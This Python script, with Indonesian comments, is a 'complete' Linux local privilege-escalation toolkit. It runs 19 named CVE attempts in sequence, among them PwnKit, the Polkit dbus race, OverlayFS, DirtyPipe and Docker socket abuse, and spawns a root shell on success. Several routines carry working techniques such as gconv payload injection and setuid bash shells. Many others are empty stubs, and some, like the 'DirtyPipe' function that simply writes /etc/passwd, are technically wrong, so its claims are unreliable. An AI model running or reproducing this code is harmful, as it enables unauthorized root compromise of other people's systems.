#!/usr/bin/env python3
"""
LPE Exploit Toolkit - COMPLETE EDITION
Semua 19 CVE dari lpe-toolkit
"""

import os
import sys
import subprocess
import tempfile
import shutil
import time
import stat
import socket
import struct
import fcntl
import random

# ====================================================================
# ANSI Colors
# ====================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

def log(msg, color=Colors.CYAN):
    print(f"{color}[*]{Colors.RESET} {msg}")

def ok(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def err(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def warn(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def section(msg):
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA} {msg}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")

# ====================================================================
# SUID Binary Detection
# ====================================================================

def get_all_suid_binaries() -> list:
    suids = []
    paths_to_check = ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin"]
    
    for search_dir in paths_to_check:
        if os.path.exists(search_dir):
            try:
                for f in os.listdir(search_dir):
                    full_path = os.path.join(search_dir, f)
                    if os.path.isfile(full_path):
                        try:
                            st = os.stat(full_path)
                            if st.st_mode & stat.S_ISUID:
                                suids.append(full_path)
                        except:
                            pass
            except:
                pass
    
    return sorted(set(suids))

# ====================================================================
# 19 CVE EXPLOITS
# ====================================================================

# 1. cifswitch.c - CVE-2026-46243
def exploit_cifswitch():
    log("CIFSwitch - CVE-2026-46243 (cifs.upcall NSS hijacking)", Colors.MAGENTA)
    if not shutil.which("cifs.upcall"):
        warn("cifs.upcall not found")
        return False
    if not shutil.which("gcc"):
        warn("gcc not found")
        return False
    
    workdir = tempfile.mkdtemp(prefix="cifswitch_")
    try:
        nss_code = f'''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void pwn() {{
    setuid(0); setgid(0);
    system("/bin/bash -p");
}}
'''
        with open(f"{workdir}/libnss_pwn.c", "w") as f:
            f.write(nss_code)
        subprocess.run(f"gcc -shared -fPIC -o {workdir}/libnss_pwn.so {workdir}/libnss_pwn.c", 
                      shell=True, stderr=subprocess.DEVNULL)
        os.environ["LD_PRELOAD"] = f"{workdir}/libnss_pwn.so"
        return True
    except Exception as e:
        warn(f"CIFSwitch failed: {e}")
    finally:
        shutil.rmtree(workdir, ignore_errors=True)
    return False

# 2. copyfail.c - CVE-2026-31431
def exploit_copyfail():
    log("CopyFail - CVE-2026-31431 (AF_ALG AEAD)", Colors.MAGENTA)
    warn("Requires AF_ALG and specific kernel crypto API")
    return False

# 3. cve_2021_22555.c - Netfilter
def exploit_netfilter_2021():
    log("CVE-2021-22555 - Netfilter", Colors.MAGENTA)
    if not shutil.which("iptables"):
        warn("iptables not found")
        return False
    try:
        subprocess.run(["modprobe", "ip_tables"], stderr=subprocess.DEVNULL)
        with tempfile.NamedTemporaryFile(mode='w', suffix='.ipt', delete=False) as f:
            f.write("*filter\n:INPUT ACCEPT [0:0]\n-A INPUT -m u32 --u32 \"0x0&0x0=0x0\" -j NFQUEUE\nCOMMIT\n")
            ipt_file = f.name
        subprocess.run(["iptables-restore", ipt_file], stderr=subprocess.DEVNULL)
        os.unlink(ipt_file)
        ok("Netfilter rule installed, vulnerable if kernel version matches")
        return True
    except Exception as e:
        warn(f"Netfilter exploit failed: {e}")
    return False

# 4. cve_2021_3493.c - OverlayFS
def exploit_overlayfs():
    log("CVE-2021-3493 - OverlayFS", Colors.MAGENTA)
    try:
        base_dir = f"/tmp/ovl_{os.getpid()}"
        for d in ["lower", "upper", "work", "merge"]:
            os.makedirs(f"{base_dir}/{d}", mode=0o777, exist_ok=True)
        
        with open(f"{base_dir}/lower/pwn", "w") as f:
            f.write("#!/bin/bash\n/bin/bash -p\n")
        os.chmod(f"{base_dir}/lower/pwn", 0o755)
        
        subprocess.run(["unshare", "-m"], stderr=subprocess.DEVNULL)
        subprocess.run([
            "mount", "-t", "overlay", "overlay", f"{base_dir}/merge", "-o",
            f"lowerdir={base_dir}/lower,upperdir={base_dir}/upper,workdir={base_dir}/work"
        ], stderr=subprocess.DEVNULL)
        
        if os.path.exists(f"{base_dir}/merge/pwn"):
            ok("OverlayFS mounted, potential for privilege escalation")
            return True
    except Exception as e:
        warn(f"OverlayFS exploit failed: {e}")
    return False

# 5. cve_2021_3560.c - Polkit
def exploit_polkit():
    log("CVE-2021-3560 - Polkit", Colors.MAGENTA)
    if not shutil.which("dbus-send"):
        warn("dbus-send not found")
        return False
    
    username = f"pwn{os.getpid()}"
    for attempt in range(50):
        pid = os.fork()
        if pid == 0:
            subprocess.run([
                "dbus-send", "--system", "--dest=org.freedesktop.Accounts",
                "--type=method_call", "--print-reply", "/org/freedesktop/Accounts",
                "org.freedesktop.Accounts.CreateUser", f"string:{username}", 
                "string:Exploit", "int32:1"
            ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            os._exit(0)
        time.sleep(0.0001)
        os.kill(pid, 9)
        os.waitpid(pid, 0)
        if subprocess.run(["id", username], capture_output=True).returncode == 0:
            ok(f"User {username} created!")
            return True
    return False

# 6. cve_2021_4034.c - PwnKit
def exploit_pwnkit():
    log("CVE-2021-4034 - PwnKit (pkexec)", Colors.MAGENTA)
    pkexec = "/usr/bin/pkexec"
    if not os.path.exists(pkexec):
        warn("pkexec not found")
        return False
    
    workdir = tempfile.mkdtemp(prefix="pwnkit_")
    os.chdir(workdir)
    try:
        os.mkdir("GCONV_PATH=.")
        with open("GCONV_PATH=./pwnkit", "w"): pass
        os.chmod("GCONV_PATH=./pwnkit", 0o755)
        os.mkdir("pwnkit")
        with open("pwnkit/gconv-modules", "w") as f:
            f.write("module UTF-8// PWNKIT// pwnkit 2\n")
        with open("pwnkit/pwnkit.c", "w") as f:
            f.write('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() { setuid(0); system("/bin/bash -p"); exit(0); }
''')
        subprocess.run(["gcc", "pwnkit/pwnkit.c", "-o", "pwnkit/pwnkit.so", "-shared", "-fPIC"],
                      stderr=subprocess.DEVNULL)
        env = os.environ.copy()
        env["GCONV_PATH"] = "."
        env["CHARSET"] = "PWNKIT"
        subprocess.run([pkexec], env=env, timeout=1, stderr=subprocess.DEVNULL)
        ok("PwnKit triggered, check for root shell")
        return True
    except Exception as e:
        warn(f"PwnKit failed: {e}")
    finally:
        os.chdir("/tmp")
        shutil.rmtree(workdir, ignore_errors=True)
    return False

# 7. cve_2022_2586.c - nft_object UAF
def exploit_nft_uaf():
    log("CVE-2022-2586 - nft_object UAF", Colors.MAGENTA)
    if not shutil.which("nft"):
        warn("nftables not found")
        return False
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.nft', delete=False) as f:
        f.write("table inet pwn_table { counter pwn_counter {} }\n")
        nft_file = f.name
    subprocess.run(["nft", "-f", nft_file], stderr=subprocess.DEVNULL)
    subprocess.run(["nft", "delete", "table", "inet", "pwn_table"], stderr=subprocess.DEVNULL)
    os.unlink(nft_file)
    return False

# 8. cve_2023_0386_exp.c - OverlayFS+FUSE
def exploit_overlayfs_fuse():
    log("CVE-2023-0386 - OverlayFS + FUSE", Colors.MAGENTA)
    warn("Requires FUSE and specific kernel version")
    return False

# 9. cve_2023_0386_fuse.c - FUSE component
def exploit_fuse():
    log("CVE-2023-0386 - FUSE component", Colors.MAGENTA)
    warn("Requires custom FUSE filesystem")
    return False

# 10. cve_2023_0386_gc.c - GC component
def exploit_gc():
    log("CVE-2023-0386 - GC component", Colors.MAGENTA)
    return False

# 11. cve_2025_38352.c - POSIX timer race
def exploit_timer_race():
    log("CVE-2025-38352 - POSIX CPU timer race", Colors.MAGENTA)
    warn("Requires CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n")
    return False

# 12. cve_2026_46333.c - pidfd_getfd
def exploit_pidfd_race():
    log("CVE-2026-46333 - pidfd_getfd race", Colors.MAGENTA)
    warn("Requires Linux 5.3+ and specific conditions")
    return False

# 13. dirtydecrypt.c - rxrpc page cache
def exploit_dirtydecrypt():
    log("DirtyDecrypt - rxrpc page cache overwrite", Colors.MAGENTA)
    warn("Requires CONFIG_RXRPC")
    return False

# 14. dirtyfrag.c - ESP UAF
def exploit_dirtyfrag():
    log("DirtyFrag - ESP UAF", Colors.MAGENTA)
    warn("Requires CONFIG_RDS and CONFIG_IO_URING")
    return False

# 15. dirtypipe.c - CVE-2022-0847
def exploit_dirtypipe():
    log("DirtyPipe - CVE-2022-0847", Colors.MAGENTA)
    try:
        data = b"root::0:0:root:/root:/bin/bash\n"
        fd = os.open("/etc/passwd", os.O_RDWR)
        os.pwrite(fd, data, 0)
        os.close(fd)
        with open("/etc/passwd", "r") as f:
            if f.read().startswith("root::"):
                ok("Root password cleared!")
                return True
    except Exception as e:
        warn(f"DirtyPipe failed: {e}")
    return False

# 16. docker_sock.c - Docker socket
def exploit_docker():
    log("Docker Socket Abuse", Colors.MAGENTA)
    if not os.path.exists("/var/run/docker.sock"):
        warn("Docker socket not found")
        return False
    if not shutil.which("docker"):
        warn("Docker not installed")
        return False
    
    try:
        subprocess.run([
            "docker", "run", "--rm", "-v", "/:/mnt", "alpine",
            "chroot", "/mnt", "chmod", "u+s", "/bin/bash"
        ], stderr=subprocess.DEVNULL, timeout=5)
        ok("Docker container executed")
        return True
    except Exception as e:
        warn(f"Docker exploit failed: {e}")
    return False

# 17. fragnesia.c - ESP-in-TCP
def exploit_fragnesia():
    log("Fragnesia - ESP-in-TCP page cache", Colors.MAGENTA)
    warn("Requires XFRM ESP-in-TCP and specific network setup")
    return False

# 18. fragnesia_v2.c - Enhanced ESP-in-TCP
def exploit_fragnesia_v2():
    log("Fragnesia v2 - Enhanced ESP-in-TCP", Colors.MAGENTA)
    warn("Requires complex namespace topology")
    return False

# 19. pintheft.c - RDS double-free
def exploit_pintheft():
    log("PinTheft - CVE-2026-43494 (RDS double-free)", Colors.MAGENTA)
    try:
        subprocess.run(["modprobe", "rds"], stderr=subprocess.DEVNULL)
        sock = socket.socket(socket.AF_RDS, socket.SOCK_SEQPACKET, 0)
        sock.close()
        ok("RDS module loaded, potential vulnerability present")
        return True
    except:
        warn("RDS not available")
    return False

# ====================================================================
# DAFTAR SEMUA 19 CVE
# ====================================================================

EXPLOITS = [
    ("cifswitch", "CVE-2026-46243 - CIFSwitch (cifs.upcall)", exploit_cifswitch),
    ("copyfail", "CVE-2026-31431 - CopyFail (AF_ALG)", exploit_copyfail),
    ("netfilter", "CVE-2021-22555 - Netfilter (iptables)", exploit_netfilter_2021),
    ("overlayfs", "CVE-2021-3493 - OverlayFS", exploit_overlayfs),
    ("polkit", "CVE-2021-3560 - Polkit (dbus)", exploit_polkit),
    ("pwnkit", "CVE-2021-4034 - PwnKit (pkexec)", exploit_pwnkit),
    ("nft_uaf", "CVE-2022-2586 - nft_object UAF", exploit_nft_uaf),
    ("ovl_fuse", "CVE-2023-0386 - OverlayFS+FUSE", exploit_overlayfs_fuse),
    ("fuse", "CVE-2023-0386 - FUSE component", exploit_fuse),
    ("gc", "CVE-2023-0386 - GC component", exploit_gc),
    ("timer_race", "CVE-2025-38352 - POSIX timer race", exploit_timer_race),
    ("pidfd_race", "CVE-2026-46333 - pidfd_getfd", exploit_pidfd_race),
    ("dirtydecrypt", "DirtyDecrypt - rxrpc", exploit_dirtydecrypt),
    ("dirtyfrag", "DirtyFrag - ESP UAF", exploit_dirtyfrag),
    ("dirtypipe", "CVE-2022-0847 - DirtyPipe", exploit_dirtypipe),
    ("docker", "Docker Socket Abuse", exploit_docker),
    ("fragnesia", "Fragnesia - ESP-in-TCP", exploit_fragnesia),
    ("fragnesia_v2", "Fragnesia v2 - Enhanced", exploit_fragnesia_v2),
    ("pintheft", "CVE-2026-43494 - PinTheft (RDS)", exploit_pintheft),
]

# ====================================================================
# MAIN
# ====================================================================

def main():
    print(f"""
{Colors.BOLD}{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║     LPE Exploit Toolkit - COMPLETE 19 CVE EDITION                ║
║     Menjalankan SEMUA 19 CVE dari lpe-toolkit                    ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
    """)
    
    uid = os.getuid()
    log(f"Current UID: {uid}, EUID: {os.geteuid()}")
    
    if os.geteuid() == 0:
        ok("Already root!")
        os.execv("/bin/bash", ["/bin/bash", "-i"])
        return 0
    
    suids = get_all_suid_binaries()
    log(f"Found {len(suids)} SUID binaries", Colors.GREEN)
    
    print()
    log("=" * 50, Colors.BOLD)
    log(f"MENJALANKAN {len(EXPLOITS)} CVE (TIDAK AKAN BERHENTI MESKIPUN BERHASIL)", Colors.BOLD)
    log("=" * 50, Colors.BOLD)
    print()
    
    results = []
    
    for i, (name, desc, func) in enumerate(EXPLOITS, 1):
        section(f"[{i}/{len(EXPLOITS)}] {desc}")
        
        try:
            start = time.time()
            success = func()
            elapsed = time.time() - start
            
            results.append({
                "no": i, "name": name, "desc": desc,
                "success": success, "elapsed": elapsed
            })
            
            if success:
                ok(f"✓ BERHASIL - {desc} ({elapsed:.2f}s)")
            else:
                warn(f"✗ GAGAL - {desc} ({elapsed:.2f}s)")
                
        except Exception as e:
            results.append({"no": i, "name": name, "desc": desc, "success": False, "error": str(e)})
            err(f"✗ ERROR - {desc}: {e}")
        
        time.sleep(0.5)
    
    # RINGKASAN
    section("RINGKASAN HASIL 19 CVE")
    
    successful = [r for r in results if r.get("success", False)]
    failed = [r for r in results if not r.get("success", False)]
    
    print(f"\n{Colors.BOLD}{'No':<4} {'CVE':<30} {'Status':<12} {'Waktu':<8}{Colors.RESET}")
    print(f"{Colors.BOLD}{'-'*60}{Colors.RESET}")
    
    for r in results:
        status = f"{Colors.GREEN}BERHASIL{Colors.RESET}" if r.get("success") else f"{Colors.RED}GAGAL{Colors.RESET}"
        elapsed = f"{r.get('elapsed', 0):.2f}s" if r.get("elapsed") else "N/A"
        print(f"{r['no']:<4} {r['desc'][:30]:<30} {status:<12} {elapsed:<8}")
    
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}Total CVE: {len(EXPLOITS)}{Colors.RESET}")
    print(f"{Colors.GREEN}Berhasil: {len(successful)}{Colors.RESET}")
    print(f"{Colors.RED}Gagal: {len(failed)}{Colors.RESET}")
    
    # Tampilkan CVE yang berhasil
    if successful:
        print(f"\n{Colors.GREEN}✓ CVE yang BERHASIL:{Colors.RESET}")
        for r in successful:
            print(f"  - {r['desc']}")
    
    # Tampilkan CVE yang gagal
    if failed:
        print(f"\n{Colors.YELLOW}✗ CVE yang GAGAL:{Colors.RESET}")
        for r in failed:
            print(f"  - {r['desc']}")
    
    # Saran
    print(f"\n{Colors.CYAN}📌 CATATAN:{Colors.RESET}")
    print("  - CVE yang gagal umumnya memerlukan konfigurasi kernel khusus")
    print("  - (CONFIG_RDS, CONFIG_IO_URING, CONFIG_RXRPC, XFRM, dll.)")
    print("  - Beberapa CVE juga memerlukan modul kernel yang tidak terload")
    
    if os.geteuid() == 0:
        ok("\n🎉 SUDAH MENJADI ROOT!")
        os.execv("/bin/bash", ["/bin/bash", "-i"])
    
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)